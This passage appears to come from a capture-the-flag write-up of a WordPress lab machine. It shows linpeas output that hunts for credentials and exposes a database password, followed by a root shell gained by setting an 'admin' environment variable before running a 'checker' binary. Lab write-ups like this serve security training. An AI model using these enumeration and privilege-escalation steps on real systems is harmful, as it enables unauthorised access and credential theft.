/var/www/wordpress/wp-includes/theme-compat/embed-content.php
/var/www/wordpress/wp-includes/theme-compat/embed.php
/var/www/wordpress/wp-includes/theme-compat/footer-embed.php
/var/www/wordpress/wp-includes/theme-compat/footer.php
/var/www/wordpress/wp-includes/theme-compat/header-embed.php
/var/www/wordpress/wp-includes/theme-compat/header.php
/var/www/wordpress/wp-includes/theme-compat/sidebar.php
/var/www/wordpress/wp-includes/theme.php
/var/www/wordpress/wp-includes/update.php
/var/www/wordpress/wp-includes/user.php
/var/www/wordpress/wp-includes/vars.php
/var/www/wordpress/wp-includes/version.php
/var/www/wordpress/wp-includes/widgets
/var/www/wordpress/wp-includes/widgets.php
/var/www/wordpress/wp-includes/widgets/class-wp-nav-menu-widget.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-archives.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-calendar.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-categories.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-custom-html.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-links.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-media-audio.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-media-gallery.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-media-image.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-media-video.php
/var/www/wordpress/wp-includes/widgets/class-wp-widget-media.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/wp-db.php
/var/www/wordpress/wp-includes/wp-diff.php
/var/www/wordpress/wp-links-opml.php
/var/www/wordpress/wp-load.php
/var/www/wordpress/wp-login.php
/var/www/wordpress/wp-mail.php
/var/www/wordpress/wp-settings.php
/var/www/wordpress/wp-signup.php
/var/www/wordpress/wp-trackback.php
/var/www/wordpress/xmlrpc.php

[+] Interesting GROUP writable files (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group www-data:
/var/www/wordpress/linpeas.sh

[+] Searching passwords in config PHP files
                        case 'DB_PASSWORD' :
        define('DB_PASSWORD', $pwd);
define('DB_PASSWORD', 'password_here');
define('DB_PASSWORD', 'LittleYellowLamp90!@');

[+] Finding IPs inside logs (limit 70)
    101 /var/log/dpkg.log:3.18.04.2
     61 /var/log/dpkg.log:3.18.04.3
     38 /var/log/dpkg.log:2.18.04.1
     30 /var/log/cloud-init-output.log:192.168.196.2
     26 /var/log/dpkg.log:7.18.04.2
     26 /var/log/dpkg.log:18.04.11.10
     18 /var/log/dpkg.log:3.192.1.7
     18 /var/log/dpkg.log:1.18.04.13
     17 /var/log/cloud-init-output.log:255.255.255.255
     15 /var/log/dpkg.log:1.18.04.1
     14 /var/log/dpkg.log:18.04.11.12
     14 /var/log/apt/history.log:3.18.04.2
     12 /var/log/dpkg.log:1.18.04.14
     11 /var/log/wtmp:192.168.196.1
     11 /var/log/dpkg.log:2.18.04.3
     11 /var/log/cloud-init-output.log:192.168.196.139
      8 /var/log/installer/subiquity-debug.log:192.168.196.139
      8 /var/log/installer/subiquity-debug.log.1594:192.168.196.139
      8 /var/log/dpkg.log:6.18.04.1
      8 /var/log/dpkg.log:5.18.04.3
      7 /var/log/apt/history.log:3.18.04.3
      4 /var/log/cloud-init-output.log:192.168.196.129
      4 /var/log/apt/history.log:2.18.04.1
      4 /var/log/apt/history.log:18.04.11.10
      3 /var/log/installer/subiquity-debug.log:192.168.196.255
      3 /var/log/installer/subiquity-debug.log.1594:192.168.196.255
      3 /var/log/apt/history.log:7.18.04.2
      2 /var/log/installer/installer-journal.txt:192.168.196.2
      2 /var/log/installer/installer-journal.txt:192.168.196.139
      2 /var/log/apt/history.log:18.04.11.12
      2 /var/log/apt/history.log:1.18.04.13
      2 /var/log/apt/history.log:1.18.04.1
      1 /var/log/installer/subiquity-debug.log:192.168.196.2
      1 /var/log/installer/subiquity-debug.log:19.12.1.5
      1 /var/log/installer/subiquity-debug.log:127.255.255.255
      1 /var/log/installer/subiquity-debug.log.1594:192.168.196.2
      1 /var/log/installer/subiquity-debug.log.1594:19.12.1.5
      1 /var/log/installer/subiquity-debug.log.1594:127.255.255.255
      1 /var/log/installer/subiquity-curtin-install.conf:19.12.1.5
      1 /var/log/installer/installer-journal.txt:91.189.89.198
      1 /var/log/installer/installer-journal.txt:19.12.1.5
      1 /var/log/cloud-init-output.log:172.30.1.189
      1 /var/log/cloud-init-output.log:10.10.180.207
      1 /var/log/apt/history.log:6.18.04.1
      1 /var/log/apt/history.log:5.18.04.3
      1 /var/log/apt/history.log:3.192.1.7
      1 /var/log/apt/history.log:2.18.04.3
      1 /var/log/apt/history.log:1.18.04.14

[+] Finding passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/cloud-init.log:2020-05-25 13:15:30,383 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2020-05-25 13:15:30,439 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
/var/log/cloud-init.log:2020-05-26 03:01:29,458 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-26 15:19:04,056 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-26 17:52:19,845 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-26 18:19:44,932 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-26 23:56:35,850 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-28 03:01:21,972 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-28 12:07:43,232 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-28 12:37:38,672 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-28 15:01:52,422 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-28 19:23:28,283 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-29 23:30:05,704 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-29 23:57:21,447 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-05-30 00:08:20,339 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-06-01 13:45:44,180 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-06-01 14:34:23,156 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-19 13:06:11,178 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dpkg.log:2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log:2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
/var/log/installer/installer-journal.txt:May 25 08:50:09 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:May 25 12:54:22 ubuntu-server chage[13683]: changed password expiry for sshd
/var/log/installer/installer-journal.txt:May 25 12:54:22 ubuntu-server usermod[13678]: change user 'sshd' password

[+] Finding emails inside logs (limit 70)
      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/subiquity-debug.log:snaps@canonical.com
      1 /var/log/installer/subiquity-debug.log.1594:snaps@canonical.com
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/nsswitch.conf:passwd:         compat systemd
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/php/7.2/apache2/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
/etc/php/7.2/cli/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
/etc/samba/smb.conf:   pam password change = yes
/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
/etc/samba/smb.conf:   passwd program = /usr/bin/passwd %u
/etc/samba/smb.conf:   unix password sync = yes
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/var/www/wordpress/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
/var/www/wordpress/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
/var/www/wordpress/linpeas.sh:    for f in $tomcat; do grep "username=" $f 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/var/www/wordpress/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
/var/www/wordpress/linpeas.sh:  PASSWORDTRY=$2
/var/www/wordpress/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
/var/www/wordpress/wp-activate.php:                             <p><span class="h3"><?php _e('Password:'); ?></span> <?php echo $result['password']; ?></p>
/var/www/wordpress/wp-admin/css/forms-rtl.css:  .wp-pwd [type="password"] {
/var/www/wordpress/wp-admin/css/forms-rtl.css:  .wp-pwd [type="text"],
/var/www/wordpress/wp-admin/css/forms-rtl.css:  .wp-pwd button.button:active {
/var/www/wordpress/wp-admin/css/forms-rtl.css:  .wp-pwd button.button:focus,
/var/www/wordpress/wp-admin/css/forms-rtl.css:  .wp-pwd button.button:hover,
/var/www/wordpress/wp-admin/css/forms-rtl.css:.form-table .form-required.user-pass1-wrap.form-invalid .password-input-wrapper:after {
/var/www/wordpress/wp-admin/css/forms-rtl.css:input[type="password"]:focus,
/var/www/wordpress/wp-admin/css/forms.css:      .wp-pwd [type="password"] {
/var/www/wordpress/wp-admin/css/forms.css:      .wp-pwd [type="text"],
/var/www/wordpress/wp-admin/css/forms.css:      .wp-pwd button.button:active {
/var/www/wordpress/wp-admin/css/forms.css:      .wp-pwd button.button:focus,
/var/www/wordpress/wp-admin/css/forms.css:      .wp-pwd button.button:hover,
/var/www/wordpress/wp-admin/css/forms.css:.form-table .form-required.user-pass1-wrap.form-invalid .password-input-wrapper:after {
/var/www/wordpress/wp-admin/css/forms.css:input[type="password"]:focus,
/var/www/wordpress/wp-admin/includes/class-ftp.php:             $this->_password="anon@ftp.com";
/var/www/wordpress/wp-admin/includes/class-ftp.php:             else $this->_password="anon@anon.com";
/var/www/wordpress/wp-admin/includes/class-ftp.php:             if(!is_null($pass)) $this->_password=$pass;
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:                    $this->options['password'] = $opt['password'];
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:            $pwd = @ftp_pwd($this->link);
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php:                        $this->options['password'] = $opt['password'];
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php:                      $this->options['password'] = $opt['password'];
/var/www/wordpress/wp-admin/includes/class-wp-importer.php:     public function get_page( $url, $username = '', $password = '', $head = false ) {
/var/www/wordpress/wp-admin/includes/export.php:                <wp:post_password><?php echo wxr_cdata( $post->post_password ); ?></wp:post_password>
/var/www/wordpress/wp-admin/includes/meta-boxes.php:    $post->post_password = '';
/var/www/wordpress/wp-admin/includes/network.php:                               $keys_salts_str .= "\ndefine( '$c', '" . wp_generate_password( 64, true, true ) . "' );";
/var/www/wordpress/wp-admin/includes/post.php:                          $_POST['post_password'] = '';
/var/www/wordpress/wp-admin/includes/post.php:                          $post_data['post_password'] = '';
/var/www/wordpress/wp-admin/includes/post.php:          $post->post_password = '';
/var/www/wordpress/wp-admin/includes/schema.php:        /* translators: Do not translate USERNAME, SITE_NAME, BLOG_URL, PASSWORD: those are placeholders. */
/var/www/wordpress/wp-admin/includes/schema.php:Password: PASSWORD
/var/www/wordpress/wp-admin/includes/upgrade.php:               $email_password = true;
/var/www/wordpress/wp-admin/includes/upgrade.php:               $user_password = wp_generate_password( 12, false );
/var/www/wordpress/wp-admin/includes/upgrade.php:       $email_password = false;
/var/www/wordpress/wp-admin/includes/upgrade.php:       $user_password = trim($user_password);
/var/www/wordpress/wp-admin/includes/upgrade.php:Password: %3\$s
/var/www/wordpress/wp-admin/includes/user.php:                  'post_password' => '',
/var/www/wordpress/wp-admin/includes/user.php:function default_password_nag_handler($errors = false) {
/var/www/wordpress/wp-admin/install.php:                                <input name="admin_password2" type="password" id="pass2" autocomplete="off" />
/var/www/wordpress/wp-admin/install.php:                $admin_password = isset($_POST['admin_password']) ? wp_unslash( $_POST['admin_password'] ) : '';
/var/www/wordpress/wp-admin/install.php:                $admin_password_check = isset($_POST['admin_password2']) ? wp_unslash( $_POST['admin_password2'] ) : '';
/var/www/wordpress/wp-admin/install.php:                if ( ! empty( $result['password'] ) && empty( $admin_password_check ) ): ?>
/var/www/wordpress/wp-admin/install.php:                } elseif ( $admin_password != $admin_password_check ) {
/var/www/wordpress/wp-admin/js/password-strength-meter.js:                      if (password1 != password2 && password2 && password2.length > 0)
/var/www/wordpress/wp-admin/js/password-strength-meter.js:      passwordStrength = wp.passwordStrength.meter;
/var/www/wordpress/wp-admin/js/password-strength-meter.js:      wp.passwordStrength = {

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/wordpress/wp-admin/includes/misc.php:  $new_admin_email = array(
/var/www/wordpress/wp-admin/includes/network.php:               $admin_email = $_POST['email'];
/var/www/wordpress/wp-admin/includes/network.php:               $admin_email = get_option( 'admin_email' );
/var/www/wordpress/wp-admin/includes/schema.php:                'admin_email' => $email,
/var/www/wordpress/wp-admin/includes/schema.php:        'admin_email' => 'you@example.com',
/var/www/wordpress/wp-admin/install.php:                $admin_email  = isset( $_POST['admin_email'] ) ?trim( wp_unslash( $_POST['admin_email'] ) ) : '';
/var/www/wordpress/wp-admin/install.php:        $admin_email  = isset( $_POST['admin_email']  ) ? trim( wp_unslash( $_POST['admin_email'] ) ) : '';
/var/www/wordpress/wp-admin/network/settings.php:                                       $new_admin_email = get_site_option( 'new_admin_email' );
/var/www/wordpress/wp-admin/network/settings.php:                                       if ( $new_admin_email && $new_admin_email != get_site_option( 'admin_email' ) ) : ?>
/var/www/wordpress/wp-admin/network/settings.php:} elseif ( ! empty( $_GET['dismiss'] ) && 'new_network_admin_email' == $_GET['dismiss'] ) {
/var/www/wordpress/wp-admin/options-general.php:$new_admin_email = get_option( 'new_admin_email' );
/var/www/wordpress/wp-admin/options-general.php:if ( $new_admin_email && $new_admin_email != get_option( 'admin_email' ) ) : ?>
/var/www/wordpress/wp-admin/options.php:} elseif ( ! empty( $_GET['dismiss'] ) && 'new_admin_email' == $_GET['dismiss'] ) {
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
/var/www/wordpress/wp-includes/js/dist/format-library.js:var strikethrough_name = 'core/strikethrough';
/var/www/wordpress/wp-includes/js/dist/vendor/react-dom.js:  accesskey: 'accessKey',
/var/www/wordpress/wp-includes/js/dist/vendor/react-dom.js:var ReactPropTypesSecret_1 = ReactPropTypesSecret$1;
/var/www/wordpress/wp-includes/js/dist/vendor/react.js:var ReactPropTypesSecret_1 = ReactPropTypesSecret$1;
/var/www/wordpress/wp-includes/load.php:        $dbhost     = defined( 'DB_HOST' ) ? DB_HOST : '';
/var/www/wordpress/wp-includes/load.php:        $dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
/var/www/wordpress/wp-includes/media.php:                       $img_url = str_replace( $img_url_basename, $meta['sizes']['full']['file'], $img_url );
/var/www/wordpress/wp-includes/media.php:                       $img_url = str_replace($img_url_basename, wp_basename($thumb_file), $img_url);
/var/www/wordpress/wp-includes/media.php:                       $img_url_basename = $meta['sizes']['full']['file'];
/var/www/wordpress/wp-includes/media.php:               $img_url = str_replace($img_url_basename, $intermediate['file'], $img_url);
/var/www/wordpress/wp-includes/media.php:       $img_url = wp_get_attachment_url($id);
/var/www/wordpress/wp-includes/media.php:       $img_url_basename = wp_basename($img_url);
/var/www/wordpress/wp-includes/ms-functions.php:                $admin_email = 'support@' . $_SERVER['SERVER_NAME'];
/var/www/wordpress/wp-includes/ms-functions.php:        $admin_email = get_site_option( 'admin_email' );
/var/www/wordpress/wp-includes/ms-functions.php:        $new_admin_email = array(
/var/www/wordpress/wp-includes/ms-functions.php:        if ( $admin_email == '' )
/var/www/wordpress/wp-includes/user.php:                'admin_email' => $admin_email,

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/wordpress/linpeas.sh:    for f in $tomcat; do grep "username=" $f 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/var/www/wordpress/wp-activate.php:                                             /* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
/var/www/wordpress/wp-activate.php:                                             /* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
/var/www/wordpress/wp-activate.php:                             <p><span class="h3"><?php _e('Username:'); ?></span> <?php echo $user->user_login ?></p>
/var/www/wordpress/wp-admin/includes/ajax-actions.php:  $username = isset( $_REQUEST['username'] ) ? wp_unslash( $_REQUEST['username'] ) : false;
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:                    $this->options['username'] = $opt['username'];
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php:                        $this->options['username'] = $opt['username'];
/var/www/wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php:                      $this->options['username'] = $opt['username'];
/var/www/wordpress/wp-admin/includes/class-wp-importer.php:                     $headers['Authorization'] = 'Basic ' . base64_encode( "$username:$password" );
/var/www/wordpress/wp-admin/includes/class-wp-importer.php:     public function get_page( $url, $username = '', $password = '', $head = false ) {
/var/www/wordpress/wp-admin/includes/class-wp-ms-users-list-table.php:                  'username'   => 'login',
/var/www/wordpress/wp-admin/includes/class-wp-ms-users-list-table.php:                  'username'   => __( 'Username' ),
/var/www/wordpress/wp-admin/includes/class-wp-users-list-table.php:                     'username' => 'login',
/var/www/wordpress/wp-admin/includes/class-wp-users-list-table.php:                     'username' => __( 'Username' ),
/var/www/wordpress/wp-admin/includes/file.php:  $credentials = get_option('ftp_credentials', array( 'hostname' => '', 'username' => ''));
/var/www/wordpress/wp-admin/includes/file.php:  $username = isset( $credentials['username'] ) ? $credentials['username'] : '';
/var/www/wordpress/wp-admin/includes/plugin-install.php:                                                $contrib_username = preg_replace( '/^.+\/(.+)\/?$/', '\1', $contrib_profile );
/var/www/wordpress/wp-admin/includes/plugin-install.php:                                        $contrib_username = sanitize_user( $contrib_username );
/var/www/wordpress/wp-admin/includes/plugin-install.php:                                foreach ( (array) $api->contributors as $contrib_username => $contrib_profile ) {
/var/www/wordpress/wp-admin/includes/plugin-install.php:                        <label for="user"><?php _e( 'Your WordPress.org username:' ); ?></label>
/var/www/wordpress/wp-admin/includes/schema.php:        /* translators: Do not translate USERNAME, SITE_NAME, BLOG_URL, PASSWORD: those are placeholders. */
/var/www/wordpress/wp-admin/includes/schema.php:Username: USERNAME
/var/www/wordpress/wp-admin/includes/upgrade.php:Username: %2\$s
/var/www/wordpress/wp-admin/js/theme.js:                                username: username
/var/www/wordpress/wp-admin/js/theme.js:        saveUsername: function ( event ) {
/var/www/wordpress/wp-admin/js/updates.js:                      username:        wp.updates.filesystemCredentials.ftp.username,
/var/www/wordpress/wp-admin/js/updates.js:                      username:       '',
/var/www/wordpress/wp-admin/ms-delete-site.php: /* translators: Do not translate USERNAME, URL_DELETE, SITE_NAME: those are placeholders. */
/var/www/wordpress/wp-admin/network/site-users.php:                     <td><input type="text" class="regular-text" name="user[username]" id="user_username" /></td>
/var/www/wordpress/wp-admin/theme-install.php:                          <input type="search" id="wporg-username-input" value="<?php echo esc_attr( $user ); ?>" />
/var/www/wordpress/wp-admin/theme-install.php:                          <label for="wporg-username-input"><?php _e( 'Your WordPress.org username:' ); ?></label>
/var/www/wordpress/wp-admin/user-edit.php:                      $public_display['display_username']  = $profileuser->user_login;
/var/www/wordpress/wp-admin/user-new.php:       $username = $user_details->user_login;
/var/www/wordpress/wp-admin/user-new.php:       if ( $username != null && array_key_exists( $blog_id, get_blogs_of_user( $user_id ) ) ) {
/var/www/wordpress/wp-includes/class-phpmailer.php:    public $Username = '';
/var/www/wordpress/wp-includes/class-snoopy.php:                                                                                                // $cookies["username"]="joe";
/var/www/wordpress/wp-includes/class-wp-http-proxy.php:         return $this->username() . ':' . $this->password();
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:                      'username'          => $user->user_login,
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $escaped_username = $this->escape( $username );
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username               = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username       = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username           = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username       = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username    = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username   = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username  = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username = $args[0];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username = $args[1];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username = $args[2];
/var/www/wordpress/wp-includes/class-wp-xmlrpc-server.php:              $username = $this->escape( $args[1] );
/var/www/wordpress/wp-includes/formatting.php:          $username = preg_replace( '|[^a-z0-9 _.\-@]|i', '', $username );
/var/www/wordpress/wp-includes/formatting.php:  $raw_username = $username;
/var/www/wordpress/wp-includes/formatting.php:  $username = preg_replace( '/&.+?;/', '', $username ); // Kill entities
/var/www/wordpress/wp-includes/formatting.php:  $username = preg_replace( '|%([a-fA-F0-9][a-fA-F0-9])|', '', $username );
/var/www/wordpress/wp-includes/formatting.php:  $username = preg_replace( '|\s+|', ' ', $username );
/var/www/wordpress/wp-includes/formatting.php:  $username = remove_accents( $username );
/var/www/wordpress/wp-includes/formatting.php:  $username = trim( $username );
/var/www/wordpress/wp-includes/formatting.php:  $username = wp_strip_all_tags( $username );
/var/www/wordpress/wp-includes/formatting.php:function sanitize_user( $username, $strict = false ) {
/var/www/wordpress/wp-includes/general-template.php:            'id_username' => 'user_login',
/var/www/wordpress/wp-includes/general-template.php:            'label_username' => __( 'Username or Email Address' ),
/var/www/wordpress/wp-includes/general-template.php:            'value_username' => '',
/var/www/wordpress/wp-includes/js/jquery/jquery.form.js:         * [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
/var/www/wordpress/wp-includes/ms-functions.php:                /* translators: Do not translate USERNAME, SITE_NAME, BLOG_URL, PASSWORD: those are placeholders. */
/var/www/wordpress/wp-includes/ms-functions.php:        $orig_username = $user_name;
/var/www/wordpress/wp-includes/ms-functions.php:Username: USERNAME
/var/www/wordpress/wp-includes/pluggable-deprecated.php:function wp_login($username, $password, $deprecated = '') {
/var/www/wordpress/wp-includes/pluggable.php:           $message .= sprintf( __( 'Username: %s' ), $user->user_login ) . "\r\n\r\n";
/var/www/wordpress/wp-includes/pluggable.php:   $message = sprintf(__('Username: %s'), $user->user_login) . "\r\n\r\n";
/var/www/wordpress/wp-includes/pluggable.php:   $username = $cookie_elements['username'];

[+] Looking for specific hashes inside files - less false positives (limit 70)

$
```

```
$ checker
checker
Not an Admin
$ export admin=1
export admin=1
$ checker
checker
root@blog:/var/www/wordpress# whoami
whoami
root
root@blog:/var/www/wordpress# cd /root
cd /root
root@blog:/root# ls -al
ls -al
total 60
drwx------  6 root root  4096 May 28 19:24 .
drwxr-xr-x 24 root root  4096 May 25 12:53 ..
lrwxrwxrwx  1 root root     9 May 26 18:17 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26 03:01 .cache
